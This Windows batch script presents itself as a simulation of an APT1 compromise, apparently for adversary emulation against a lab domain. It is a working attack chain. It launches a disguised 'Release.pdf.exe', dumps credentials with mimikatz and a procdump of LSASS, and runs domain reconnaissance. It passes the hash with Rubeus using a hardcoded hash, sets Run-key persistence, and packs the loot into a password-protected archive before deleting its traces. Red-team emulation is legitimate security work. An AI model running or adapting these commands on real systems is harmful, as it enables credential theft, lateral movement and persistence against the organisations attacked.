@echo off

echo Simulating APT1 Compromise...
echo.
echo.
echo Initial shell...

REM Define the path to the ZIP file
set "zipFilePath=C:\Tools\Internal_Discussion_Press_Release_In_Next_Week8.zip"

REM Define the destination directory where the contents will be extracted
set "extractedDir=C:\Users\Public"

REM Unzip the file using PowerShell
powershell -Command "Expand-Archive -Path '%zipFilePath%' -DestinationPath '%extractedDir%' -Force"

REM Define the path to the extracted executable
set "executablePath=%extractedDir%\Release.pdf.exe"
REM Run the extracted executable in the background
    start "" "%executablePath%"

echo.
echo.
echo Privilege Escalation...


C:\Tools\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" >> "C:\Users\Public\d.txt" exit 


set "processName=lsass.exe"
set "dumpFileName=C:\Users\Public\lsass.dmp"

REM Check if the process is running
tasklist /fi "imagename eq %processName%" | findstr /i "%processName%"
if %errorlevel% neq 0 (
    echo Process %processName% not found.
    goto :end
)

REM Create minidump using procdump
set "procdumpPath=C:\Tools\procdump.exe" REM Adjust path to procdump.exe if needed

"%procdumpPath%" -accepteula -ma %processName% "%dumpFileName%"

if exist "%dumpFileName%" (
    echo Minidump of %processName% created successfully in "%dumpFileName%"
) else (
    echo Failed to create minidump of %processName%.
)

:end

echo.
echo.

echo Internal Reconnaissance...
ipconfig /all >> "C:\Users\Public\1.txt"
net start >> "C:\Users\Public\1.txt"
tasklist /v >> "C:\Users\Public\1.txt"
net user >> "C:\Users\Public\1.txt"
net localgroup administrators >> "C:\Users\Public\1.txt"
netstat -ano >> "C:\Users\Public\1.txt"
net use >> "C:\Users\Public\1.txt"
net view >> "C:\Users\Public\1.txt"
net view /domain >> "C:\Users\Public\1.txt"
net group /domain >> "C:\Users\Public\1.txt"
net group "domain users" /domain >> "C:\Users\Public\1.txt"
net group "domain admins" /domain >> "C:\Users\Public\1.txt"
net group "domain controllers" /domain >> "C:\Users\Public\1.txt"
net group "exchange domain servers" /domain >> "C:\Users\Public\1.txt"
net group "exchange servers" /domain >> "C:\Users\Public\1.txt"
net group "domain computers" /domain >> "C:\Users\Public\1.txt"



echo.
echo.
echo Pass The Hash...
C:\Tools\Rubeus.exe asktgt /domain:DCLOUD.LOCAL /user:administrator /rc4:e34021c5d62008947221c6086ccbd0c0 /ptt >> "C:\Users\Public\2.txt"
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:DCLOUD.LOCAL /rc4:e34021c5d62008947221c6086ccbd0c0 /run:whoami" exit >> "C:\Users\Public\3.txt"
echo.
echo.
echo Presence...

set KeyName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
set EntryName=Release
set EntryValue="C:\Users\Public\Release.pdf.exe"

REM Check if the registry entry exists
reg query "%KeyName%" /v "%EntryName%" >nul 2>&1
if %errorlevel% equ 0 (
    REM If the entry exists, overwrite it
    reg add "%KeyName%" /v "%EntryName%" /t REG_SZ /d %EntryValue% /f
    echo Entry "%EntryName%" overwritten.
) else (
    REM If the entry does not exist, create it
    reg add "%KeyName%" /v "%EntryName%" /t REG_SZ /d %EntryValue%
    echo Entry "%EntryName%" created.
)

echo.
echo.
echo Exfiltration...
cd /d C:\Users\Public

rem Create RAR archive for txt and dmp files with a password
"C:\Program Files\WinRAR\rar.exe" a XXXXXXXX.rar *.txt *.dmp -v200m "C:\Users\Public\XXXXXXXX" -hpmy123!@# 

rem Delete txt and dmp files after archiving
del *.txt
del *.dmp

pause